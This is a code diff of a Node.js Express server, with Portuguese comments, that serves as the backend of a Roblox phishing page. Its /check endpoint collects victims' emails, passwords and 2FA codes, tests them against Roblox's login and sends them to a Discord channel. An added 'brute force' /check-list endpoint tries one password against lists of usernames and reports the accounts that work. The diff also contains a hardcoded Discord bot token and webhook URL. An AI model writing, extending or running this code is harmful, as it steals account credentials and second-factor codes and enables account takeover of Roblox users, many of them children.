@@ -1,146 +1,190 @@
 const express = require('express');
 const axios = require('axios');
+const { Client, GatewayIntentBits } = require('discord.js');
+
 const app = express();
 const port = process.env.PORT || 3000;
 
-// SEU WEBHOOK DO DISCORD (Certifique-se de que este URL está correto!)
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
+// --- CONFIGURAÇÕES DO BOT ---
+// O teu Token já está aqui
+const DISCORD_TOKEN = "MTUzNDk1NTYzNzU5Mzg2NjI3MA.GgZEm3.ba7HDvARqCAoMVMPx7h-o8bFrovrLLxXT1i4i8";
+
+// ATENÇÃO: Coloca aqui o ID do CANAL onde o bot vai escrever
+// Exemplo: "1534955637593866271" (Clica no canal no Discord > Copiar ID)
+const CHANNEL_ID = "1533498302845157608"; 
+
+// Inicializar o Bot
+const client = new Client({ intents: [GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
+
+let isBotReady = false;
+
+client.on('ready', () => {
+    console.log(`✅ Bot conectado como ${client.user.tag}!`);
+    isBotReady = true;
+});
+
+client.login(DISCORD_TOKEN);
 
 app.use(express.json());
 app.use(express.static('.'));
 
-// Função para fazer login no Roblox com Cookies Atualizados
-async function loginRoblox(email, password) {
-    const baseUrl = "https://www.roblox.com";
-    const loginUrl = `${baseUrl}/users/login`;
+// Função para enviar mensagem via BOT
+async function sendDiscordMessage(content) {
+    return new Promise((resolve, reject) => {
+        const sendMessage = async () => {
+            try {
+                const channel = await client.channels.fetch(CHANNEL_ID);
+                if (channel) {
+                    await channel.send({
+                        content: content,
+                        username: "Roblox Bot",
+                        avatarURL: 'https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg'
+                    });
+                    console.log("Mensagem enviada ao Discord!");
+                    resolve(true);
+                } else {
+                    console.error("Canal não encontrado! Verifique o CHANNEL_ID.");
+                    reject("Canal não encontrado");
+                }
+            } catch (error) {
+                console.error("Erro ao enviar mensagem:", error);
+                reject(error);
+            }
+        };
 
-    // Criar um "Axios Instance" para manter os cookies entre as requisições
-    const robloxClient = axios.create({
-        baseURL: baseUrl,
-        timeout: 15000,
-        headers: {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'application/json',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Referer': 'https://www.roblox.com/'
+        if (isBotReady) {
+            sendMessage();
+        } else {
+            // Se o bot ainda estiver carregando, espera um pouco
+            setTimeout(() => {
+                if (isBotReady) {
+                    sendMessage();
+                } else {
+                    reject("Bot ainda não estava pronto");
+                }
+            }, 2000);
         }
     });
+}
 
+// Função para verificar se o Usuário existe (API de Busca Robusta)
+async function checkUserExists(username) {
     try {
-        // PASSO 1: Visitar a página principal para pegar os Cookies do Cloudflare
-        // Isso gera o cookie '__cf_bm' e outros necessários
-        console.log("Passo 1: Pegando cookies do Roblox...");
-        await robloxClient.get('/', {
-            validateStatus: function (status) {
-                return status < 500; // Aceita 200, 301, 302, etc.
-            }
+        const response = await axios.get('https://www.roblox.com/users/search', {
+            params: { query: username, limit: 1, offset: 0 },
+            headers: { 'User-Agent': 'Mozilla/5.0', 'X-Requested-With': 'XMLHttpRequest' },
+            timeout: 5000
         });
+        
+        if (response.data && response.data.Users && response.data.Users.length > 0) {
+            const user = response.data.Users[0];
+            // Verifica se o nome é exatamente o mesmo (case-insensitive)
+            if (user.Name.toLowerCase() === username.toLowerCase()) {
+                return { exists: true, id: user.Id, displayName: user.DisplayName, name: user.Name };
+            }
+        }
+        return { exists: false };
+    } catch (error) {
+        return { exists: false };
+    }
+}
 
-        // PASSO 2: Fazer o Login usando os mesmos cookies
-        console.log("Passo 2: Fazendo login...");
+// Função para tentar Login no Roblox
+async function tryLogin(email, password) {
+    const baseUrl = "https://www.roblox.com";
+    const robloxClient = axios.create({
+        baseURL: baseUrl,
+        timeout: 10000,
+        headers: {
+            'User-Agent': 'Mozilla/5.0',
+            'Accept': 'application/json',
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+    });
+    try {
+        await robloxClient.get('/');
         const response = await robloxClient.post('/users/login', {
             username: email,
             password: password
         }, {
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            validateStatus: function (status) {
-                return status < 500;
-            }
+            headers: { 'Content-Type': 'application/json' },
+            validateStatus: status => status < 500
         });
-
+        
         const data = response.data;
-
-        // O Roblox retorna { id: 123, username: "User" } no sucesso
         if (data.id && typeof data.id === 'number') {
-            return { success: true, data: data, error: null };
-        } else {
-            // Se não tem ID, pega no erro
-            const errorMsg = data.error || data.message || "Resposta inválida (Sem ID)";
-            return { success: false, data: data, error: errorMsg };
+            return { success: true, username: data.username, id: data.id };
         }
-
-    } catch (error) {
-        let errorMsg = "Erro Desconhecido";
-        if (error.response) {
-            // O servidor respondeu com erro (ex: 400, 401)
-            errorMsg = `Erro HTTP ${error.response.status}: ${JSON.stringify(error.response.data)}`;
-        } else if (error.request) {
-            // A requisição foi feita mas não recebeu resposta
-            errorMsg = "Sem resposta do servidor Roblox (Timeout ou Bloqueio)";
-        } else {
-            errorMsg = error.message;
-        }
-        return { success: false, data: null, error: errorMsg };
+        return { success: false, error: data.error || "Senha Errada" };
+    } catch (e) {
+        return { success: false, error: "Erro de Conexão" };
     }
 }
 
-async function sendToDiscord(message) {
-    try {
-        await axios.post(WEBHOOK_URL, { content: message });
-    } catch (e) { 
-        console.error("Erro no Webhook:", e.message);
+// ENDPOINT DE LISTA (BRUTE FORCE)
+app.post('/check-list', async (req, res) => {
+    const { list, password } = req.body;
+    
+    if (!list || !Array.isArray(list) || list.length === 0) {
+        return res.json({ success: false, error: "Lista vazia" });
     }
-}
 
+    const results = [];
+    let foundCount = 0;
+    // Limitamos a 20 para não travar o servidor
+    const maxChecks = list.slice(0, 20);
+
+    for (const usernameOrEmail of maxChecks) {
+        const cleanName = usernameOrEmail.trim();
+        const userCheck = await checkUserExists(cleanName);
+
+        if (userCheck.exists) {
+            foundCount++;
+            results.push({ status: "FOUND", username: userCheck.name, id: userCheck.id, original: cleanName });
+            
+            // Se tiver senha, tenta login para confirmar
+            if (password) {
+                const loginResult = await tryLogin(cleanName, password);
+                if (loginResult.success) {
+                    await sendDiscordMessage(
+                        `**✅ CONTA VÁLIDA COM SENHA!**\n**User:** ${loginResult.username}\n**Email/Name:** ${cleanName}\n**Senha:** ${password}`
+                    );
+                    results[results.length -  1].loginConfirmed = true;
+                }
+            }
+        } else {
+            results.push({ status: "NOT_FOUND", original: cleanName });
+        }
+        // Pausa de 200ms entre cada verificação
+        await new Promise(r => setTimeout(r, 200));
+    }
+
+    await sendDiscordMessage(`**📊 RESULTADO DA VERIFICAÇÃO**\n**Total:** ${maxChecks.length} | **Encontradas:** ${foundCount}`);
+
+    return res.json({ success: true, results: results, found: foundCount });
+});
+
+// ENDPOINT DE LOGIN ÚNICO
 app.post('/check', async (req, res) => {
     const { email, password, code2fa, isFinalStep } = req.body;
 
-    // Se for o passo final (2FA), envia direto e diz que deu certo
     if (isFinalStep) {
-        const discordMessage = `**🔒 LOGIN COMPLETO (2FA)**\n\n` +
-                               `**Email:** ${email}\n` +
-                               `**Password:** ${password}\n` +
-                               `**Code 2FA:** ${code2fa}\n` +
-                               `**Timestamp:** ${new Date().toISOString()}`;
-        await sendToDiscord(discordMessage);
+        await sendDiscordMessage(`**🔒 LOGIN COMPLETO (2FA)**\n**Email:** ${email}\n**Code:** ${code2fa}`);
         return res.json({ success: true });
     }
 
     if (!email || !password) {
-        return res.json({ success: false, error: "Falta o Email ou a Senha" });
+        return res.json({ success: false, error: "Falta Email ou Senha" });
     }
 
-    // Tenta o login com o método melhorado
-    const result = await loginRoblox(email, password);
+    const result = await tryLogin(email, password);
 
     if (result.success) {
-        // Login deu certo
-        const username = result.data.username || "Unknown";
-        const userId = result.data.id || "Unknown";
-        
-        const discordMessage = `**🔒 CONTA ENCONTRADA!**\n\n` +
-                               `**Email:** ${email}\n` +
-                               `**Password:** ${password}\n` +
-                               `**Username:** ${username}\n` +
-                               `**User ID:** ${userId}\n` +
-                               `**Timestamp:** ${new Date().toISOString()}`;
-        await sendToDiscord(discordMessage);
-
-        return res.json({
-            success: true,
-            username: username,
-            userId: userId,
-            error: ""
-        });
+        await sendDiscordMessage(`**✅ CONTA VÁLIDA!**\n**User:** ${result.username}\n**Email:** ${email}\n**Senha:** ${password}`);
+        return res.json({ success: true, username: result.username, userId: result.id, error: "" });
     } else {
-        // Login falhou
-        const errorMsg = result.error || "Conta ou Senha Incorretas";
-        
-        const discordMessage = `**❌ LOGIN FALHOU**\n\n` +
-                               `**Email:** ${email}\n` +
-                               `**Password:** ${password}\n` +
-                               `**Erro:** ${errorMsg}\n` +
-                               `**Timestamp:** ${new Date().toISOString()}`;
-        await sendToDiscord(discordMessage);
-
-        return res.json({
-            success: false,
-            username: "Unknown",
-            userId: "Unknown",
-            error: errorMsg
-        });
+        await sendDiscordMessage(`**❌ LOGIN FALHOU**\n**Email:** ${email}\n**Erro:** ${result.error}`);
+        return res.json({ success: false, username: email, userId: "Unknown", error: result.error });
     }
 });
 
